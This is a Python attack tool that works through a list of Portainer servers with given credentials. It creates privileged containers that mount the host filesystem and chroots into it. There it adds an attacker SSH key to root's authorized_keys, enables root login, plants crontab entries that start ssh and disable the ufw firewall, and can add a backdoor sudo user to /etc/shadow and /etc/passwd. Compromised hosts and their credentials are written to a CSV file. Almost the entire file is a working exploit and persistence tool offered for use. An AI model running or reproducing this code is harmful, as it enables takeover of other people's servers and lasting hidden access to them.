#! /usr/bin/env python3

import socket, os, requests, json, paramiko, string, random
from base64 import b64encode
from getpass import getpass
from datetime import date
from subprocess import check_output
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Pool, Lock, cpu_count
from time import strftime, localtime, sleep

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

thread_count = cpu_count()
lock = Lock()
check_ssh = True
get_unique_uid = "$(awk -F: '$3 > 1000 {print $3}' /host/etc/passwd | sort -n | awk 'BEGIN{prev=1001} {if ($1 > prev) {print prev; exit} prev=$1+1} END{if (prev > 1001) print prev}' | head -1)"
shadow_file_ending = "$(cat /host/etc/shadow | grep root | sed 's/^[^:]*:[^:]*://' | head -1)"
passwd_file_ending = "$(cat /host/etc/passwd | grep root | sed 's/^[^:]*:[^:]*:[^:]*//' | head -1)"
password_characters = string.ascii_letters + string.digits

def check_port(host, port, timeout=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            socket.setdefaulttimeout(timeout)
        result = sock.connect_ex((host, port))
    except:
        return False
    else:
        if result == 0:
            return True
        sock.close()
def generatePublicPrivateKeys():
    display(':', "Creating New Private/Public Key Pairs")
    display('+', "Enter the file in which to save the key : ", end='')
    key_path = input()
    key_passphrase = getpass("Enter the Passphrase for the key : ")
    os.system(f"ssh-keygen -t rsa -b 4096 -C root -f '{key_path}' -N '{key_passphrase}'")
    return key_path, key_passphrase
def generatePassword(length):
    return ''.join([random.choice(password_characters) for _ in range(length)])
def generateHash(password):
    return check_output(f"openssl passwd -6 -salt {generatePassword(16)} {password}".split(' ')).decode().split('\n')[0]

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

class Portainer:
    auth_api = "/api/auth"
    endpoints_api = "/api/endpoints"
    endpoint_docker_images = "/docker/images/json"
    endpoint_docker_image_push = "/docker/images/load"
    endpoint_docker_image_delete = "/docker/images/"
    endpoint_docker_container_create = "/docker/containers/create"
    endpoint_docker_container_delete = "/docker/containers/"

    allowed_images = ["ubuntu", "debian", "fedora"]
    image_file = "ubuntu_image.tar"
    default_image_name = "ubuntu:20.04"

    ssh_port = 22
    ssh_configure_commands = "echo '* * * * * root systemctl start ssh' >> /etc/crontab && echo '* * * * * root ufw disable' >> /etc/crontab && "
    cronjob_remove_commands = "grep -v '* * * * * root systemctl start ssh' /etc/crontab > /tmp/crontab && mv /tmp/crontab /etc/crontab"
    cronjob_sleep_time = 90

    container_name = "health_test"

    def __init__(self, ip, port, scheme="http"):
        self.ip = ip
        self.port = port
        self.url = f"{scheme}://{ip}:{port}"
        self.headers = {}
    def auth(self, username, password):
        login_data = {
            "username": username,
            "password": password
        }
        response = requests.post(f"{self.url}{Portainer.auth_api}", json=login_data)
        if response.status_code // 100 == 2:
            self.token = json.loads(response.text)["jwt"]
            self.headers["Authorization"] = f"Bearer {self.token}"
            return True
        elif response.status_code // 100 == 5:
            return True
        return False
    def getEndpoints(self):
        response = requests.get(f"{self.url}{Portainer.endpoints_api}", headers=self.headers)
        if response.status_code // 100 == 2:
            self.endpoints = json.loads(response.text)
            return True
        return False
    def getEndpointImages(self, endpoint):
        response = requests.get(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_images}", headers=self.headers)
        return json.loads(response.text) if response.status_code // 100 == 2 else False
    def pushEndpointImage(self, endpoint, image_data):
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_image_push}", headers=self.headers, data=image_data)
        return True if response.status_code // 100 == 2 else False
    def removeEndpointImage(self, endpoint, image_name):
        response = requests.delete(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_image_delete}{image_name}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def createEndpointContainer(self, endpoint, container_name, image_name, command, host_volume_path='/', container_mounted_path='/host', privileged_mode=True):
        container_config = {
            "Hostname": container_name,
            "Image": image_name,
            "Cmd": ["/bin/sh", '-c', command],
            "HostConfig": {
                "Binds": [f"{host_volume_path}:{container_mounted_path}:rw"],
                "Privileged": privileged_mode
            }
        }
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_container_create}", headers=self.headers, json=container_config)
        return json.loads(response.text)["Id"] if response.status_code // 100 == 2 else False
    def startEndpointContainer(self, endpoint, container_id):
        endpoint_docker_container_delete = f"/docker/containers/{container_id}/start"
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{endpoint_docker_container_delete}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def waitEndpointContainer(self, endpoint, container_id):
        endpoint_docker_container_wait = f"/docker/containers/{container_id}/wait"
        response = requests.post(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{endpoint_docker_container_wait}", headers=self.headers)
        return json.loads(response.text)["StatusCode"] if response.status_code // 100 == 2 else False
    def deleteEndpointContainer(self, endpoint, container_id):
        response = requests.delete(f"{self.url}{Portainer.endpoints_api}/{endpoint['Id']}{Portainer.endpoint_docker_container_delete}{container_id}", headers=self.headers)
        return True if response.status_code // 100 == 2 else False
    def exploit(self, public_key, private_key_file_path, private_key_passphrase, user, ssh_password, check_ssh_port=True):
        endpoint_status = self.getEndpoints()
        if not endpoint_status:
            return []
        exploit_statues = []
        for index, endpoint in enumerate(self.endpoints):
            images = self.getEndpointImages(endpoint)
            if not images:
                exploit_statues.append(False)
                continue
            required_image_found, required_image_name = False, None
            for image in images:
                if image["RepoTags"] == None:
                    continue
                available_images = [available_image.split(':')[0] for available_image in image["RepoTags"]]
                for allowed_image in Portainer.allowed_images:
                    if allowed_image in available_images:
                        for available_image in image["RepoTags"]:
                            if available_image.startswith(allowed_image):
                                with lock:
                                    display('+', f"Found Image {Back.MAGENTA}{available_image}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                                required_image_found = True
                                required_image_name = available_image
                                break
                        break
                if required_image_found:
                    break
            else:
                with lock:
                    display('-', f"Any Preinstalled usable Docker Image not found on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}!")
                required_image_name = Portainer.default_image_name
                with open(Portainer.image_file, 'rb') as file:
                    image_data = file.read()
                with lock:
                    display('*', f"Pushing Image {Back.MAGENTA}{required_image_name}{Back.RESET} to {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                image_push_status = self.pushEndpointImage(endpoint, image_data)
                if not image_push_status:
                    with lock:
                        display('-', f"Failed to Push Image {Back.MAGENTA}{required_image_name}{Back.RESET} to {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    exploit_statues.append(False)
                    continue
            commands = ""
            if check_ssh_port:
                ssh_port_status = check_port(self.ip, Portainer.ssh_port)
                if not ssh_port_status:
                    with lock:
                        display(':', f"SSH was not Running on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}. Adding Configuration Scripts in CRONJOB!")
                    commands += Portainer.ssh_configure_commands
            else:
                ssh_port_status = True
            with lock:
                display('+', f"Using Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display('-', f"Exploiting {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}...")
            useradd = False
            pkey_commands = commands +  f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config_0 && grep -v 'PubkeyAuthentication' /tmp/sshd_config_0 > /tmp/sshd_config && rm -f /tmp/sshd_config_0 && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && grep -v 'Port' /etc/ssh/sshd_config >/tmp/sshd_config && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo Port 22 >> /etc/ssh/sshd_config && echo '' >> /root/.ssh/authorized_keys && grep '{public_key}' -v /root/.ssh/authorized_keys > /tmp/authorized_keys && mv /tmp/authorized_keys /root/.ssh/authorized_keys && echo {public_key} >> /root/.ssh/authorized_keys"
            with lock:
                display(':', f"Using Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to Create a Container")
            container_id = self.createEndpointContainer(endpoint, Portainer.container_name, required_image_name, f"chroot /host /bin/bash -c \"{pkey_commands}\"")
            if not container_id:
                with lock:
                    display('-', f"Failed to Create Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                exploit_statues.append(False)
                continue
            with lock:
                display('+', f"Container created with Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display(':', f"Starting the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            start_status = self.startEndpointContainer(endpoint, container_id)
            if not start_status:
                with lock:
                    display('-', f"Failed to start Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                exploit_statues.append(False)
                continue
            with lock:
                display('+', f"Started the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                display(':', f"Waiting for the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to finish Execution")
            container_exit_status = self.waitEndpointContainer(endpoint, container_id)
            with lock:
                display('+', f"Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} finished Executing")
                display(':', f"Deleting Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            delete_status = self.deleteEndpointContainer(endpoint, container_id)
            if not delete_status:
                with lock:
                    display('-', f"Failed to Delete Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            else:
                with lock:
                    display('+', f"Deleted Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            with lock:
                display(':', f"Checking if Target {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} was successfully exploited or not")
            exploit_check_status, info = self.check_exploit(private_key_file_path, private_key_passphrase, wait=False if ssh_port_status else True)
            if exploit_check_status:
                with lock:
                    display('+', f"Successfully Exploited Target => {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
            else:
                with lock:
                    display('-', f"Failed to Exploit Target {Back.YELLOW}{self.ip}:{self.port}{Back.RESET} {info}")
                    if user:
                        display(':', f"Adding user {Back.MAGENTA}{user}{Back.RESET} on Target {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                if user:
                    with lock:
                        display(':', f"Using Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to Create a Container")
                    ssh_password_base64 = b64encode(ssh_password.encode()).decode()
                    user_commands = commands + f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config_0 && grep -v 'PasswordAuthentication' /tmp/sshd_config_0 > /tmp/sshd_config && rm -f /tmp/sshd_config_0 && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && grep -v 'Port' /etc/ssh/sshd_config >/tmp/sshd_config && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo Port 22 >> /etc/ssh/sshd_config && echo -n {user}: >> /etc/shadow && echo -n '{ssh_password_base64}' | base64 --decode >> /etc/shadow && echo :{shadow_file_ending} >> /etc/shadow && echo '{user}:x:'{get_unique_uid}{passwd_file_ending} >> /etc/passwd && echo '{user} ALL=(ALL:ALL) ALL' >> /etc/sudoers"
                    container_id = self.createEndpointContainer(endpoint, Portainer.container_name, required_image_name, f"chroot /host /bin/bash -c \"{user_commands}\"")
                    if not container_id:
                        with lock:
                            display('-', f"Failed to Create Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                        exploit_statues.append(False)
                        continue
                    with lock:
                        display('+', f"Container created with Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                        display(':', f"Starting the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    start_status = self.startEndpointContainer(endpoint, container_id)
                    if not start_status:
                        with lock:
                            display('-', f"Failed to start Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                        exploit_statues.append(False)
                        continue
                    with lock:
                        display('+', f"Started the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                        display(':', f"Waiting for the Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} to finish Execution")
                    container_exit_status = self.waitEndpointContainer(endpoint, container_id)
                    with lock:
                        display('+', f"Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} finished Executing")
                        display(':', f"Deleting Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    delete_status = self.deleteEndpointContainer(endpoint, container_id)
                    if not delete_status:
                        with lock:
                            display('-', f"Failed to Delete Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    else:
                        with lock:
                            display('+', f"Deleted Container on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                    with lock:
                        display(':', f"Checking if Target {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} was successfully exploited or not")
                    exploit_check_status, info = self.check_exploit(user=user, password=user_password)
                    with lock:
                        if exploit_check_status:
                            useradd = True
                            display('+', f"Successfully Exploited Target => {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
                        else:
                            display('-', f"Failed to Exploit Target {Back.YELLOW}{self.ip}:{self.port}{Back.RESET} {info}")
            if not required_image_found:
                with lock:
                    display(':', f"Deleting Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                image_delete_status = self.removeEndpointImage(endpoint, required_image_name)
                if not image_delete_status:
                    with lock:
                        display('-', f"Failed to Delete Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
                else:
                    with lock:
                        display('+', f"Deleted Image {Back.MAGENTA}{required_image_name}{Back.RESET} on {Back.MAGENTA}{self.ip}:{self.port}{Back.RESET}")
            exploit_statues.append([True if container_exit_status == 0 and exploit_check_status else False, useradd])
        return exploit_statues
    def check_exploit(self, private_key_file_path=None, private_key_passphrase=None, user="root", password=None, wait=False, port=22):
        if wait:
            sleep(Portainer.cronjob_sleep_time)
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            private_key = paramiko.RSAKey.from_private_key_file(private_key_file_path, private_key_passphrase) if private_key_file_path != None else None
            ssh_client.connect(self.ip, port=port, username=user, pkey=private_key, look_for_keys=False, allow_agent=False) if private_key != None else ssh_client.connect(self.ip, port=port, username=user, password=password, look_for_keys=False, allow_agent=False)
            stdin, stdout, stderr = ssh_client.exec_command("uname -a")
            info = stdout.readlines()[0]
            ssh_client.close()
            return True, info.replace('\n', '')
        except Exception as error:
            return False, error

def multiProcessingHandler(targets, key_path=None, public_key=None, key_passphrase=None, user=None, ssh_password=None, checkPort=True):
    successful_exploits = []
    for ip, port, username, password in targets:
        portainer_target = Portainer(ip, port)
        with lock:
            display(':', f"Authentication {Back.MAGENTA}{ip}:{port}{Back.RESET}...")
        try:
            auth_status = portainer_target.auth(username, password)
            if not auth_status:
                with lock:
                    display('-', f"Authentication Failed for {Back.MAGENTA}{ip}:{port}{Back.RESET}")
                continue
        except Exception as error:
            with lock:
                display('-', f"Authentication Failed for {Back.MAGENTA}{ip}:{port}{Back.RESET}")
            continue
        with lock:
            display('+', f"Authentication Successful {Back.MAGENTA}{ip}:{port}{Back.RESET}")
        try:
            exploit_statues = portainer_target.exploit(public_key, key_path, key_passphrase, user, ssh_password, checkPort)
            if True in [exploit_status[0] for exploit_status in exploit_statues]:
                with lock:
                    display('+', f"Successfully Exploited {Back.MAGENTA}{ip}:{port}{Back.RESET}")
                successful_exploits.append([ip, port, user if True in [exploit_status[1] for exploit_status in exploit_statues] else username, user_password if True in [exploit_status[1] for exploit_status in exploit_statues] else password])
        except Exception as error:
            with lock:
                display('-', f"Error while Exploiting {Back.MAGENTA}{ip}:{port}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            continue
    return successful_exploits

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "JSON File Containing Information about Targets ([[IP, PORT, USERNAME, PASSWORD], ...])"),
                              ('-p', "--keys-path", "key_path", "Path for Public Key for SSH (Leave Empty to Generate New)"),
                              ('-u', "--user", "user", "User to Add in the Target Machine (If Public Key Authentication Fails)"),
                              ('-c', "--check-port", "check_port", f"Check SSH Port (True/False, Default={check_ssh})"),
                              ('-w', "--write", "write", "File to Dump Successful Exploited Targets (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Information File{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = json.loads(file.read())
        except FileNotFoundError:
            display('-', f"File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}Not Found{Back.RESET}")
            exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.key_path:
        try:
            with open(f"{arguments.key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
            key_passphrase = getpass(f"Enter Passpharse for {arguments.key_path} : ")
            key_path = arguments.key_path
        except FileNotFoundError:
            key_path, key_passphrase = generatePublicPrivateKeys()
            try:
                with open(f"{key_path}.pub", 'r') as file:
                    arguments.public_key = file.read().replace('\n', '').strip()
            except Exception as error:
                display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{arguments.public_key}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    else:
        key_path, key_passphrase = generatePublicPrivateKeys()
        try:
            with open(f"{key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.user:
        arguments.user = None
        user_password = generatePassword(0)
        display('*', f"No User Provided")
    else:
        user_password = getpass(f"Enter the Password for {arguments.user} : ")
    if arguments.check_port == "False":
        arguments.check_port = False
    else:
        arguments.check_port = check_ssh
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    total_targets = len(arguments.target)
    target_divisions = [arguments.target[group*total_targets//thread_count: (group+1)*total_targets//thread_count] for group in range(thread_count)]
    pool = Pool(thread_count)
    threads = []
    successful_exploits = []
    for thread_index, target_division in enumerate(target_divisions):
        threads.append(pool.apply_async(multiProcessingHandler, (target_division, key_path, arguments.public_key, key_passphrase, arguments.user, generateHash(user_password), arguments.check_port)))
    for thread in threads:
        successful_exploits.extend(thread.get())
    pool.close()
    pool.join()
    display(':', f"Dumping Successfully Exploited Targets to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'w') as file:
        file.write(f"IP,PORT,USERNAME,PASSWORD\n")
        file.write('\n'.join([f"{ip},{port},{username},{password}" for ip, port, username, password in successful_exploits]))